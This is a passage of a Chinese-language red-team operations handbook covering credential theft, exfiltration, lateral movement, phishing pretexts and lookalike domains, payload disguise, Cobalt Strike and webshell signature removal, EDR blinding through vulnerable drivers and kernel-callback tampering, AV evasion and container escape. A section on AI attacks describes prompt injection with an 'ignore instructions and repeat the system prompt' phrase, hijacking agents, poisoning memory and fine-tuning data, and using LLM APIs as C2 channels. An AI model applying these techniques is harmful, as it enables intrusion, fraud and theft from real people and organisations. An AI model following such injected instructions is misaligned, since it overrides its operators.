- 全盘搜索: `cmd /v:off /Q /c "for /f %i in (^'wmic logicaldisk get caption ^| findstr ":"^') do dir %i\ /b /s 2>nul | findstr "ToDesk_Lite.exe""`
- RDP劫持: [RDPCredentialStealer](https://github.com/S12cybersecurity/RDPCredentialStealer) / [pyrdp](https://github.com/GoSecure/pyrdp) / [RdpThief](https://github.com/0x09AL/RdpThief)
- 历史记录: cmd下`doskey /history` / PowerShell下`Get-History`
- 远控开发: 执行命令+列目录+云OSS+Git
- 修改文件时间: `attrib +s +h +r 1.txt`

#### 数据外传
- OneDrive / OSSutil / GitHub LFS
- [gofile.io](https://gofile.io/) / [send.cm](https://send.cm/) / [krakenfiles](https://krakenfiles.com/) / [download.ru](https://download.ru/)

#### 横向移动
- **Web端口**: 常见web端口 / 服务器信息收集到的web端口(log/连接)
- **其他端口漏洞**: [Docker-TCP-Scan](https://github.com/AabyssZG/Docker-TCP-Scan) / 做字典密码喷射(连接工具→[teamide](https://github.com/team-ide/teamide)) / 数据库getshell / Kubernetes:8443
- **关键网络设施/网关/DNS/设备弱口令**: DNS劫持(甲方蓝军/国际酒店/Ettercap|HTTP) / Switch弱口令(cirtx) / [CVE-2024-20399 Cisco RCE](https://github.com/Blootus/CVE-2024-20399-Cisco-RCE)
- 爆破域名

#### 找域
- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- resolv.conf(DNS) / /etc/krb5.conf / smb.conf / cifs挂载 / 找NAS / 找AD验证web服务 / 源码+服务器配置文件
- 找VDI(常见的域信息收集命令，涉及请求与空服务器的都不要用) / 找WSUS / 找SCCM / 找EDR管控终端
- 查看网络连接: 139(双网卡) / 445 / 389 / 636
- GitLab等...

#### TV/向日葵

---

## 6. 服务器及个人PC信息收集

### 6.1 主机管理工具解密

| 工具类别 | 工具/项目 |
|---------|----------|
| Shell管理 | FinalShell → [FinalShellGetPass](https://github.com/MaskCyberSecurityTeam/FinalShellGetPass) / Xshell |
| 邮件 | Foxmail |
| 浏览器 | Chrome → [ChromeKatz](https://github.com/Meckazin/ChromeKatz) / unlock / 影子文件([BrowserPivot](https://github.com/StarfireLab/BrowserPivot)) / DPAPI秘钥 / [chromecookiestealer](https://github.com/magisterquis/chromecookiestealer) |
| 全平台 | [LaZagne](https://github.com/AlessandroZ/LaZagne) |
| Telegram | [telegram-desktop-decrypt](https://github.com/atilaromero/telegram-desktop-decrypt) |
| VPN解密 | [Decrypting and Replaying VPN Cookies](https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e) |
| ToDesk/向日葵/VNC | [readTdose-xiangrikui](https://github.com/flydyyg/readTdose-xiangrikui) / [PasswordDecrypts](https://github.com/frizb/PasswordDecrypts) |
| KeePass | [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper) |
| 密码解密汇总 | [passwd_decrypt_Tools](https://github.com/lemonlove7/passwd_decrypt_Tools) / [Pillager](https://github.com/qwqdanchun/Pillager) / [GoThief](https://github.com/Pizz33/GoThief) / [SharpScribbles](https://github.com/V1V1/SharpScribbles) / [cstealer](https://github.com/can-kat/cstealer) |

**pyinstaller打包**: `pyinstaller.exe -F BBScan.py --clean --add-data rules;rules` (主机不出网工具需打包exe)

---

## 7. 钓鱼

### 7.1 话术

| 目标 | 话术 |
|------|------|
| 赌客 | 系统故障(无法开户/充值/提现) / 开启代理(无法返水) / 海外赌客(无法添加银行卡) |
| 应聘 | 发送简历→约会议室→面试软件升级 |
| 合作 | 公会会长 / 赌客资料一手 / 四方支付(成功率低|线下) / 包网服务(提供案例/源码/更新) |

### 7.2 域名购买/水坑搭建

**域名选择**: [Expireddomains.com](http://www.expireddomains.com/) (typo/unicode) / [Unicode字符列表](https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8) / [ditto](https://github.com/evilsocket/ditto)

**SPF绕过**: [spf](https://github.com/SummerSec/spf) / [espoofer](https://github.com/chenjj/espoofer) / [swaks](https://github.com/jetmore/swaks) / [emkei.cz](https://emkei.cz/) / [Mail-Probe](https://github.com/r00tSe7en/Mail-Probe) / 子机构自建邮服域名 / SendGrid / mailgun

**水坑页面制作**:
| 类型 | 工具/方法 |
|------|---------|
| Chrome钓鱼 | [Google Chrome](https://www.google.com/intl/zh-CN/chrome/) |
| Flash钓鱼 | [Flash-Pop](https://github.com/r00tSe7en/Flash-Pop) / [FakeFlash](https://github.com/crow821/FakeFlash) |
| 客服系统升级 | XSS → 自建客服平台 → 文件内容解析(markdown标签) |
| 钓鱼模板 | [SiteCopy](https://github.com/Threezh1/SiteCopy) / [smalltool](https://smalltool.github.io/) / [zphisher](https://github.com/htr-tech/zphisher) / [EvilnoVNC](https://github.com/JoelGMSec/EvilnoVNC) / evilginx |
| Fake Login | [fakelogonscreen](https://github.com/bitsadmin/fakelogonscreen) / [SharpLocker](https://github.com/Pickfordmatt/SharpLocker) / [CredsLeaker](https://github.com/Dviros/CredsLeaker) / [Evilginx2-Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets) / [evilginx-collection](https://github.com/klezVirus/evilginx-collection) / [Web-Windows-Login-Phishing](https://github.com/eversinc33/Web-Windows-Login-Phishing) |

**后端环境搭建及反沙箱**:
- OTP: [asnphishing](https://github.com/asnzodiac/asnphishing)
- XSS自搭平台(cookie不泄露给第三方)
- [Goblin](https://goblin.xiecat.fun/guide/#flash-demo) (Flash自己改)
- [lure](https://github.com/highmeh/lure) (收集email|配合emailall)
- [Session-Hijacking-Visual-Exploitation](https://github.com/doyensec/Session-Hijacking-Visual-Exploitation)
- [evilgophish](https://github.com/fin3ss3g0d/evilgophish)

### 7.3 恶意载荷制作方式

| 技术 | 工具/说明 |
|------|---------|
| WinRAR自解压 + CVE-2023-38831 | [exploit](https://github.com/b1tg/CVE-2023-38831-winrar-exploit) |
| RLO文件名倒置 | `os.rename('1.exe', '1\u202egnp.exe')` / exe→scr/pif |
| LNK快捷方式 | [lnkbomb](https://github.com/dievus/lnkbomb) / [Lnk-Trojan](https://github.com/Yihsiwei/Lnk-Trojan) / [Rocabella](https://github.com/nickvourd/Rocabella) / [FTPlnk_phishing](https://github.com/Pizz33/FTPlnk_phishing) |
| 文件捆绑 | [GoFileBinder](https://github.com/inspiringz/GoFileBinder) |
| CHM | easychm + HTML HELP ActiveX: `<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">` |
| ICO替换 | [BeCyIconGrabber](https://jarlpenguin.github.io/BeCyIconGrabberPortable/) / [Resource Hacker](https://www.angusj.com/resourcehacker/) / [IconsExt](https://www.nirsoft.net/utils/iconsext.html) |
| B2E | [B2E](https://github.com/tokyoneon/B2E) - notepad+chcp 1200+PowerShell IEX下载 |
| 超长文件名 | - |
| 二维码 | [cli.im/tools](https://cli.im/tools) |
| CrossNet | [CrossNet-Beta](https://github.com/dr0op/CrossNet-Beta) - 学习思路 |
| PDF | [Bad-Pdf](https://github.com/deepzec/Bad-Pdf) |
|  smuggling | [BobTheSmuggler](https://github.com/TheCyb3rAlpha/BobTheSmuggler) |

---

## 8. 远控工具开发

### 8.1 CobaltStrike实战去特征免杀

#### 插件开发(BOF/CNA)
| 工具 | 功能 |
|------|------|
| [LSTAR](https://github.com/lintstar/LSTAR) | 综合信息收集 |
| [OperatorsKit](https://github.com/REDMED-X/OperatorsKit) | 运维工具 |
| [CS-AutoPostChain](https://github.com/lintstar/CS-AutoPostChain) | 自动化后渗透 |
| [Ghosting-BOF](https://github.com/qigpig/Ghosting-BOF) | - |
| [WindowSpy](https://github.com/CodeXTF2/WindowSpy) | 窗口监控 |
| [CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF) | 远程操作 |
| [PrivKit](https://github.com/mertdas/PrivKit) | 提权 |
| [PPEnum](https://github.com/rasta-mouse/PPEnum) | 权限枚举 |
| [Chisel-Strike](https://github.com/m3rcer/Chisel-Strike) | 隧道 |
| [cmstplua-uac-bypass](https://github.com/tijme/cmstplua-uac-bypass) | UAC绕过 |
| [CSx4Ldr](https://github.com/yutianqaq/CSx4Ldr) | 加载器 |
| [AceLdr](https://github.com/kyleavery/AceLdr) | 位置无关代码加载 |
| [bof-vs](https://github.com/Cobalt-Strike/bof-vs) | VS BOF模板 |
| [No-Consolation](https://github.com/fortra/No-Consolation) | 控制台隐藏 |
| [BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit) | 内存补丁 |
| [ScreenShot-BOF](https://github.com/qwqdanchun/ScreenShot-BOF) | 截图 |
| [SCMUACBypass](https://github.com/rasta-mouse/SCMUACBypass) | SCM UAC绕过 |
| [Slacker](https://github.com/9bie/Slacker) | - |
| [Mockingjay_BOF](https://github.com/ewby/Mockingjay_BOF) | - |
| [ScreenshotBOFPlus](https://github.com/baiyies/ScreenshotBOFPlus) | - |
| [DropSpawn_BOF](https://github.com/Octoberfest7/DropSpawn_BOF) | - |
| [HiddenDesktop](https://github.com/WKL-Sec/HiddenDesktop) | 隐藏桌面 |
| [whereami](https://github.com/boku7/whereami) | 地理定位 |
| [Cookie-and-Handle-Stealer](https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer) | 凭证窃取 |

**BOF开发参考**: [bof_helper](https://github.com/dtmsecurity/bof_helper) / [Visual-Studio-BOF-template](https://github.com/securifybv/Visual-Studio-BOF-template)

#### 服务器设置
- 禁ping: `/etc/sysctl.conf` → `net.ipv4.icmp_echo_ignore_all=1`
- CDN: 免费CF账号

#### Beacon修改
**特征修改核心**:
```
1. 修改Key: OriginKey → CustomizeKey
2. Profile:
   - strrep "beacon.x64.dll" "" (修改关键字)
   - set magic_mz_x86 "1234"; set magic_mz_x64 "5678" (修改MZ头)
   - set magic_pe "BB" (修改PE头)
   - set cleanup "true" (清除原始Beacon DLL)
   - set obfuscate "true" (去掉DLL头部)
   - set userwx "false" (不给可写)
3. SleepMask: 修改key和异或逻辑
   - my_mask_section中修改key = "cf81d743beef8422"
   - 修改MSSE pipe特征
4. 替代Beacon: [geacon_plus](https://github.com/Z3ratu1/geacon_plus) / [beacon-rust](https://github.com/b1tg/cobaltstrike-beacon-rust) / [Beacon.dll](https://github.com/NoOne-hub/Beacon.dll)(简单逆向) / [Beacon_Source](https://github.com/kyxiaxiang/Beacon_Source)
```

**Profile工具**: [Burp2Malleable](https://github.com/CodeXTF2/Burp2Malleable) / [C2concealer](https://github.com/RedSiege/C2concealer) / [GraphStrike](https://github.com/RedSiege/GraphStrike) / [goMalleable](https://github.com/D00Movenok/goMalleable) / [pyMalleableC2](https://github.com/byt3bl33d3r/pyMalleableC2) / [JustC2file](https://github.com/Peithon/JustC2file)

**BeaconEye检测特征**: `6A 00`

### 8.2 流量转发工具二次开发

**修改方法**:
| 方向 | 具体操作 |
|------|---------|
| 修改UA头 | [UA参考](https://hasdata.com/blog/user-agents-for-web-scraping) / User-Agent Switcher and Manager插件 |
| 配置文件自删除 | 硬编码配置到main(XOR加密ip/port) / 配置后`os.Remove(cfgFile)` |
| 远程加载配置 | - |
| TLS指纹 | [burp-awesome-tls](https://github.com/sleeyax/burp-awesome-tls) / frp pkg/util/net/tls.go |
| 域前置 | pkg/util/net/websocket.go + CDN配置回源HTTP |
| 外联小众协议 | QUIC: `transport.protocol = "quic"` |
| Protobuf插件 | frp protobuf支持 |
| 自定义加解密 | ChaCha20 / XOR / 复杂加密给配置文件认证+流量包简单加密(不然卡) |
| 去硬编码 | salt/json数据 → 可能崩溃需动调 / 认证部分指纹(models/msg/msg.go) / `FrpWebsocketPath = "/~!frp"` |
| 编译混淆加壳 | UPX / garble / [go-strip](https://github.com/boy-hack/go-strip) |
| DLL加载 | - |
| 签名伪造 | [Sign-Sacker](https://github.com/langsasec/Sign-Sacker) |

**框架结构学习方法**(以fscan为例):
```
common → 数据解析/结构体/变量存储
plugins → 插件(理解项目结构从写插件开始)
webscan → web扫描(框架指纹识别/调度流程)
关键函数: 正看框架逻辑(改框架) → 打断点倒看调用(改插件)
动态调试 + 加解密加log输出
```

### 8.3 哥斯拉去特征

**自定义流量加密**:
- 去除MD5校验: core/ApplicationConfig.java
- 去掉HTTP头特征
- 修改key取值为后16位: ShellEntity.getSecretKeyX + 加密类.generate

**自定义命令执行**:
- 修改execCommand: 复制cmd到临时目录执行并删除
- 修改默认变量名
- 重新编译后替换payload.dll
- 修改ShellExecCommandPanel默认命令

**WebShell去特征**:
- 修改反射Load方法名和GetMethod过特征免杀(Java/C#一样)
- 其他变量随意修改
- 根据GenerateShellShellLoder的填充方式修改template/base64.bin
- 修改shell.aspx去掉头尾
- ILspy反编译payload.dll导出源码修改文件名类名

**插件开发**:
- 修改打包好的jar替换原始lib中的jar
- [Godzilla API](https://beichendream.github.io/godzillaApi/)
- 包名: `shells.plugins.*` + PluginnAnnotation注解 + Plugin接口
- Swing UI设计
- 菜单注册: `MainActivity.registerJMenu/registerPluginJMenuItem/registerShellViewJMenuItem`(必须在static代码块中)

**需要的工具**: JETBRAIN IDEA / RIDER / ILspy / sqlitestudio / Visual Studio 2022

---

## 9. 木马免杀

### 9.1 EDR实战环境搭建

| EDR | 方法 |
|-----|------|
| 趋势 | [卡饭教程](https://bbs.kafan.cn/thread-2277040-1-1.html) / [TrendMicroDSAExfil](https://github.com/emdnaia/TrendMicroDSAExfil)(奇安信零信任有同样问题) |
| 赛门铁克 | [卡饭教程](https://bbs.kafan.cn/thread-2270682-1-1.html) |
| MDE | 官方购买安装(改系统区域) |
| 通用 | [卡饭论坛](https://bbs.kafan.cn/forum-89-1.html)下载教程 / 咸鱼市场 |

**安装顺序**: 先服务端再客户端 → 上线后给虚拟机打镜像 → 测免杀先断网 → 联网样本需去调试信息及符号表

### 9.2 白驱动致盲EDR

**开发环境**: [WDK](https://learn.microsoft.com/zh-cn/windows-hardware/drivers/) → 先SDK再WDK → 缓解143系列 → 出现wdm成功

**Kill用户态Process**: 终端下线 → ZwTerminateProcess → blackout(CLIENT_ID结构)

**禁用EDR回调**:
| 回调 | 作用 | 禁用方法 |
|------|------|---------|
| ObRegisterCallbacks | 进程/线程句柄操作(PsProcessType/PsThreadType) | CallbackList → PreOperation/PostOperation = 0 |
| CmRegisterCallback | 注册表访问/修改 | CallbackListHead → PEX_CALLBACK_FUNCTION → 改为双向链表已存在地址(PG保护会蓝屏) |
| MiniFilter | 文件创建/修改/删除 | volume → FLT_VOLUMES → _CALLBACK_NODE → 替换为系统驱动结构地址 |
| PsSetCreateProcessNotifyRoutine | 进程创建/销毁 | EX_CALLBACK_ROUTINE_BLOCK.Function |
| PsSetCreateThreadNotifyRoutine | 线程创建/销毁 | 同上 |
| PsSetLoadImageNotifyRoutine | Image加载(EXE/DLL/驱动) | 同上 |

**参考**: [ReactOS](https://reactos.org/)

**LOLDrivers**: [loldrivers.io](https://www.loldrivers.io/drivers/)

**内核Fuzz工具**: [ioctlfuzzer](https://github.com/Cr4sh/ioctlfuzzer)(打开核心内存转储) / [ioctlbf](https://github.com/koutto/ioctlbf) / [kDriver-Fuzzer](https://github.com/k0keoyo/kDriver-Fuzzer) / [DIBF](https://github.com/nccgroup/DIBF) / [kAFL](https://github.com/IntelLabs/kAFL) / [IoctlHunter](https://github.com/Z4kSec/IoctlHunter) / [msFuzz](https://github.com/0dayResearchLab/msFuzz) / [ioctlance](https://github.com/zeze-zeze/ioctlance)

**BYOVD利用**: [payson-ioctl-cheat-driver](https://github.com/paysonism/payson-ioctl-cheat-driver) / [BYOVDKit](https://github.com/Hagrid29/BYOVDKit) / [BYOVD](https://github.com/BlackSnufkin/BYOVD)

### 9.3 加密混淆免杀

#### 静态查杀 vs 免杀

| 查杀方式 | 检测内容 | 免杀方法 |
|---------|---------|---------|
| 特征码 | hash/文件名/函数名/敏感字符串/API / PE头/导入导出/TLS/节区/shellcode特征 | 分段 / 加解密(AES/RSA/古典密码) / 编码(XOR/Base64/UUID/MAC/IP/注册表键值/剪切板) |
| 云查杀 | - | 断网编译去调试信息 |
| 启发式 | 机器学习/YARA | 变量名混淆([pyob](https://pyob.oxyry.com/)) / 控制流混淆 / 修改无影响shellcode特征(CS一字节干掉YARA) |
| - | - | 序列化(Protobuf/Pickle) / **将shellcode当字符串处理** / 分离加载(文件/URL) |

**动态加载API**:
```
Level 1: LoadLibrary + GetProcAddress
Level 2: fs→TEB→PEB→kernel32.dll→LoadLibrary+GetProcAddress
Level 3: SSN→Syscall
  - SSN表: https://j00ru.vexillium.org/syscalls/nt/64/
  - 工具: [SysWhispers3](https://github.com/klezVirus/SysWhispers3) / [HellBunny](https://github.com/voidvxwt/HellBunny)
```

**内存加载器**:
```
申请: VirtualProtect / VirtualAlloc / AllocADsMem / ReallocADsMem / HeapCreate
写入: RtlMoveMemory / RtlCopyMemory
执行: EnumSystemLocalesA / CreateThread / WaitForSingleObject
工具: [ZigStrike](https://github.com/0xsp-SRD/ZigStrike)
函数替换: http://ropgadget.com/posts/abusing_win_functions.html
加载器内部执行: 容易规避杀软检测
```

#### 动态查杀 vs 免杀

**反沙箱**: 开机时间 / 物理内存 / CPU个数 / Temp文件数 / 随机字符串服务器校验 / USB记录 / 样本名称 / 硬盘大小 / 能否联网 / 能否使用命名管道

**注入技术**:
| 技术 | 说明 |
|------|------|
| 动态内存加载 | inline hook sleep(自定义sleep逻辑) / CreateTimerQueueTimer |
| 远程线程注入 | CreateRemoteThread → OpenProcess+VirtualAllocEx+WriteProcessMemory |
| APC注入 | APC+间接系统调用+模块踩踏 / QueueUserApc / Early Bird |
| DLL劫持 | WinSxS DLL劫持 / Microsoft组件劫持(OneDrive) / DLL劫持自动化脚本 |
| 回调 | EnumChildWindows / AlternativeShellcodeExec |
| LLVM混淆 | [Arkari](https://github.com/KomiMoe/Arkari) |
| 打断进程链 | 3环: `ldte→InInitializationOrderModuleList` / 0环: `PsActiveProcessHead→Eprocess` |
| 注入其他进程 | 被杀不死加载器 |
| 内核注入 | [Step Bear - EDR Storm-0978](https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/) |

#### 流量查杀 vs 免杀

| 查杀方向 | 检测内容 |
|---------|---------|
| 流量特征 | 固定通信协议加密字段(CS: RSA传AES密钥→AES加密通信) |
| 内容特征 | data字段命令关键词加密特征 |
| 结构特征 | 固定字段特征 |
| IP | C2服务器IP |

---

## 10. 调证镜像系统还原(Linux)

1. **恢复镜像**: `qemu-img convert -f raw 要转换的.raw -O vmdk 生成的.vmdk` ([QEMU下载](https://qemu.weilnetz.de/w64/))
2. **修改虚拟机配置**: 选使用现有磁盘
3. **修改密码**: 启动页面按e → 单用户模式 → `ro`后面改为`rw init=/bin/bash` → 删除cloud-init → `passwd`
4. **修改网络**: `ip a` → `dhclient eth0` → 网络选择仅主机
5. **信息收集**: 查看历史命令 / 查看服务 / 服务对应文件

---

## 11. 实战字典与工具包

**字典**: [9bie/dict](https://github.com/9bie/dict) / [SecDictionary](https://github.com/SexyBeast233/SecDictionary) / [MyDict](https://github.com/r00tSe7en/MyDict)

**快速代码审计**: [FindEverything](https://github.com/AabyssZG/FindEverything) / [CodeReviewTools](https://github.com/Ppsoft1991/CodeReviewTools) / [code-inspector](https://github.com/4ra1n/code-inspector) / [jar-analyzer](https://github.com/jar-analyzer/jar-analyzer)

**扫描检测**: [Situational-Awareness](https://github.com/cmluZw/Situational-Awareness) / [WatchAD](https://github.com/Qianlitp/WatchAD) / [WatchAD2.0](https://github.com/Qihoo360/WatchAD2.0) / [abyssalfish-os](https://abyssalfish-os.github.io/) / 云态势感知(SA)

**密码解密汇总**: [passwd_decrypt_Tools](https://github.com/lemonlove7/passwd_decrypt_Tools) / [Pillager](https://github.com/qwqdanchun/Pillager) / [GoThief](https://github.com/Pizz33/GoThief)

**Java反编译**: [javadecompilers.com](http://www.javadecompilers.com/) / [jar-analyzer](https://github.com/jar-analyzer/jar-analyzer)

**BBScan打包**: `pyinstaller.exe -F BBScan.py --clean --add-data rules;rules`

---

## 12. AI赋能攻击

> AI已从防御方武器变为攻击方武器。以下是基于真实APT活动总结的攻击思路。

### 12.1 AI生成式钓鱼(已实战化)

**Deepfake语音/视频钓鱼**: 克隆高管声音→电话指令转账/密码重置 / 视频会议中伪造CFO面容
- 技术原理: GAN+扩散模型 → 少量样本即可高保真复制声音/面部
- 实战思路: 收集目标高管公开演讲视频(YouTube/财报会议) → 训练模型 → 伪造紧急电话指令

**LLM辅助钓鱼**(已有多起APT案例):
- **攻击链**: LLM自动分析受害者LinkedIn/Twitter/行业论坛 → 构建心理画像 → 生成个性化邮件
  - 邮件无语法错误、无传统检测"红旗"特征
  - 引用真实事件("我在柏林Gartner安全峰会上和您聊过")、真实同事名字
  - 自动化A/B测试不同话术版本优化点击率
- **Microsoft 2025年发现的AI混淆钓鱼**: SVG文件内使用商业术语(revenue/operations/risk/shares)编码恶意payload，而非传统加密混淆 → 传统钓鱼检测完全失效。Microsoft Security Copilot分析后认为"非人类手写，极可能由LLM生成"
- **防御难点**: AI写的邮件在语义层面无异常，传统规则+人工培训均无法识别

### 12.2 AI辅助恶意代码(实战案例)

**LAMEHUG(CERT-UA 2025.07发现)**:
- 攻击思路: 钓鱼附件伪装为AI画图工具(AI_generator_uncensored_Canvas_PRO_v0.9.exe)
- 核心创新: 恶意代码调用HuggingFace API上的Qwen 2.5-Coder-32B-Instruct模型，**实时生成**侦察/窃密/系统操控命令
- 流程: `LLM_QUERY_EX()函数构建prompt → 发送到HuggingFace API → LLM返回Windows命令 → 本地执行`
- 意义: 恶意行为由LLM动态生成，静态分析无法预判具体行为，每次执行命令不同

**SesameOp(Microsoft DART 2025.11发现)**:
- 攻击思路: 后门植入使用**OpenAI Assistants API作为C2通道**
- 流程: 恶意组件OpenAIAgent.Netapi64 → 调用OpenAI Assistants API获取命令 → 解密执行 → 结果加密后回传OpenAI
- 隐蔽性: C2流量与正常AI API调用完全混合，payload压缩+分层加密(对称+非对称)
- 意义: 无需自建C2基础设施，利用合法AI服务中转

**ShadowAI(Akamai 2025发现)**:
- 攻击思路: 恶意软件将C2通信伪装为`/v1/chat/completions`端点请求
- 流程: 发送Base64编码字符串(伪装为LLM请求) → 响应经XOR+Base64解密后执行指令
- 隐蔽性: 混入企业日益增长的LLM API正常流量中，网络层无法区分

**Unit42 2026.01研究(前瞻性攻击)**:
- 攻击思路: 网页中嵌入精心构造的prompt → 调用合法LLM API → 实时生成钓鱼JS代码 → 浏览器执行
- 关键: 每次访问生成的钓鱼页面代码结构不同(多态)，无静态payload可检测
- 防御: 需要运行时行为分析(浏览器沙箱+实时检测)，无法依赖静态/网络层

**自动化免杀思路**:
- LLM根据Patch diff自动生成漏洞利用代码
- LLM生成多态/变形Shellcode(每次编译结构不同但功能相同)
- AI辅助YARA规则对抗(分析检测规则 → 生成规避变体)

### 12.3 AI增强侦察自动化

- LLM自动化分析目标公开信息→生成攻击面报告
- AI辅助代码审计(漏洞模式识别)
- 自动化社工信息关联(多平台OSINT聚合)

### 12.4 AI驱动的Device Code钓鱼(EvilTokens PhaaS)

**Microsoft 2026.04披露的大规模攻击活动**:
- 攻击链: AI生成个性化邮件(RFP/发票/制造业工作流主题) → 受害者点击链接 → 动态生成Device Code → 自动填入Microsoft登录页 → 用户在真实Microsoft页面完成MFA → 攻击者获取Access Token
- **关键创新**: 动态Device Code生成绕过15分钟过期限制。传统攻击预生成code放入邮件，用户20分钟后打开即失效；新方法在用户点击链接时才启动flow，15分钟窗口内有效
- **EvilTokens PhaaS工具包**: 将整个攻击自动化为服务
- 参见 §17.1 Device Code Phishing完整技术分析

### 12.5 AI基础设施攻击（训练/推理栈漏洞）

> 攻击 AI 系统本身的基础设施——PyTorch/vLLM/SGLang/训练框架的 2025-2026 真实 CVE。

**反序列化供应链（CWE-502）**:

| 漏洞 | 组件 | 原理 |
|------|------|------|
| CVE-2025-32434 (9.3) | PyTorch <2.6.0 | `weights_only=True` 被绕过——legacy tar checkpoint 的 storages 加载路径绕过 `_weights_only_unpickler` 白名单 |
| CVE-2025-67729 (8.8) | LMDeploy ≤0.11 | 6处 `torch.load()` 无参数（不带 `weights_only`），恶意 `.pt`/`.bin` 加载即执行 |
| CVE-2026-46432 (7.8) | LMDeploy <0.13.0 | `trust_remote_code=True` 硬编码且无 opt-out，HF 仓库 `configuration_*.py` 在模型加载时 import 执行 |
| CVE-2025-66448 | vLLM <0.11.1 | HF `auto_map` 双仓库绕过——恶意仓库配合 `trust_remote_code` 实现 RCE |

**攻击链**: 恶意 `.pt`/`.pkl`/`.bin` → HF 发布 → 受害者 `from_pretrained()` 或 `torch.load()` → `__reduce__` 执行 → 反弹/持久化

**防御**: `safetensors` 替代 pickle / `RestrictedUnpickler` 白名单 / `picklescan` 入库扫描 / `trust_remote_code` 显式 opt-in

**推理引擎网络攻击面**:

| CVE | 组件 | 攻击面 |
|-----|------|--------|
| CVE-2026-3059 (9.8) | SGLang ≤0.5.9 | ZMQ 组件间通信全部无认证 + pickle 序列化 → 远程 RCE |
| CVE-2025-47277 (9.8) | vLLM 0.6.5-0.8.4 | PyNcclPipe 分布式组件 pickle RCE（TCPStore 默认监听 0.0.0.0） |
| CVE-2025-6242 | vLLM <0.11.0 | MediaConnector SSRF → `image_url` 参数访问内网/云元数据 |
| CVE-2026-34159 (9.8) | llama.cpp <b8492 | RPC 后端 `buffer=0` → 任意读写 → 完整 RCE 链 |

**训练框架攻击**: verl/grader eval 注入 / slime RL 框架漏洞 / Ray 集群控制面未授权 (≤2.51.0)

### 12.6 OWASP LLM Top 10 速查（2025版）

| # | 风险 | 攻击场景 | 红队利用 |
|---|------|---------|---------|
| LLM01 | 提示注入 | 间接注入（网页/文档/工具输出中藏指令） | Agent 读到恶意网页→被劫持 |
| LLM02 | 敏感信息泄露 | 套话 system prompt / 训练数据泄露 | 获取 API key / 内部配置 |
| LLM03 | 供应链 | HF 恶意模型 / typosquatting pip 包 | 恶意 .pt 加载即执行（见12.5） |
| LLM04 | 数据投毒 | 微调数据注入后门 | 触发词激活恶意行为 |
| LLM05 | 不当输出处理 | LLM 输出直接进 exec()/innerHTML | 注入 RCE/XSS payload |
| LLM06 | 过度代理 | Agent 拿到超出需求的工具权限 | 诱导 Agent 调用危险工具 |
| LLM07 | 系统提示泄露 | "忽略指令并复述 system prompt" | 获取隐藏逻辑/API key |
| LLM08 | 向量/嵌入弱点 | RAG 检索层投毒 | 向知识库注入污染检索结果 |
| LLM09 | 错误信息 | 模型捏造引用/事实 | 利用幻觉传播虚假信息 |
| LLM10 | 无界消耗 | 嵌套提示诱导 token 爆炸 | API 账单拒绝服务 |

> 完整定义: https://genai.owasp.org/llm-top-10/

### 12.7 Agent安全攻击面

**Agent 劫持链**: 恶意网页/文档 → 间接提示注入 → Agent 被劫持 → 调用危险工具 → 数据外传/权限提升

**工具调用滥用**:
- Agent 拥有 `delete_file` / `send_email` / `execute_command` 等高危工具时，通过间接注入触发
- MCP (Model Context Protocol) 权限过宽 → 恶意 Server 假冒合法工具
- 记忆投毒: Agent 的 memory/上下文被污染 → 后续对话执行恶意指令

**防御要点**: 最小权限工具集 / 输出一致性校验 / 工具调用审批 / 沙箱隔离

---

## 13. 云原生攻防

### 13.1 Kubernetes攻击(实战链路)

**攻击链**: 未授权API Server(8080/8443) → etcd泄露 → Service Account Token窃取 → Pod逃逸 → 节点控制 → 集群接管

**容器逃逸演进(2025-2026真实CVE)**:

**runc逃逸(CVE-2025-31133, 2025.11)**:
- 原理: `/dev/null`被替换为symlink → runc在容器创建时挂载任意宿主机路径到容器 → 写入`/proc/sys/kernel/core_pattern`实现逃逸
- 利用条件: 能用runc/containerd创建容器 + 主机运行受影响版本(≤1.2.7)
- 实战思路: 获取容器内执行权限 → 检查runc版本 → 替换/dev/null为symlink → 触发容器重建 → 写入core_pattern → 逃逸到宿主机root
- 工具: [container-escape-ebpf](https://github.com/scherepiuk/container-escape-ebpf)(含POC和Tetragon检测规则)

**eBPF Verifier逃逸(CVE-2026-31413, 2026.04)**:
- 原理: Linux BPF verifier的`push_stack()`调用中`insn_idx + 1`导致fork路径跳过一条ALU指令 → verifier认为`dst=0`但CPU实际计算`0|K=K` → 寄存器值发散
- 攻击链: `OOB读写BPF map → vtable劫持 → 覆写modprobe_path → 触发未知二进制格式 → 内核以root执行攻击者脚本`
- 利用条件: 需`CAP_BPF`+`CAP_PERFMON`+`CAP_NET_ADMIN`(特权容器具备)
- 影响版本: Linux 6.12.75+到7.0-rc4
- 修复: 一字符修改(`insn_idx + 1`→`insn_idx`)
- 实战意义: 大多数生产K8s集群跑旧内核，需先`uname -r`确认版本

**eBPF零日(CVE-2025-41111, 2026.03)**:
- 原理: Linux内核eBPF verifier缺陷 → 认证攻击者从容器内绕过seccomp/AppArmor/Pod Security Policy
- 攻击链: `注入恶意eBPF代码(sidecar/特权DaemonSet) → verifier缺陷提权 → 切换host user namespace → 禁用SELinux/AppArmor → 挂载宿主机文件系统 → 安装持久rootkit`
- 可链式攻击: 结合PackageGate(npm/pnpm/Bun供应链) → 从CI/CD管道注入 → 集群级别接管

**CDK cgroup2_eBPF_bypass(2026.02新增)**:
- 原理: Cgroup v2中设备访问由eBPF程序控制 → 遍历宿主机所有活跃eBPF程序ID → 强制从容器cgroup挂载点卸载 → 设备控制解除 → 创建设备节点读取宿主机磁盘
- 实战: `./cdk run cgroup2-ebpf-bypass` → `debugfs -w ./cdk_mknod_v2_result` → 浏览宿主机文件(包括/root/.ssh)

**eBPF Rootkit实战(LinkPro, 2025.10 Synacktiv发现)**:
- 目标: AWS EKS集群
- 部署: 恶意Docker镜像`kvlnt/vv` → 包含两个eBPF模块
- 隐蔽机制: 模块1 hook `sys_bpf` → 匹配自身程序ID → 返回错误码 → 对bpftool等管理工具不可见
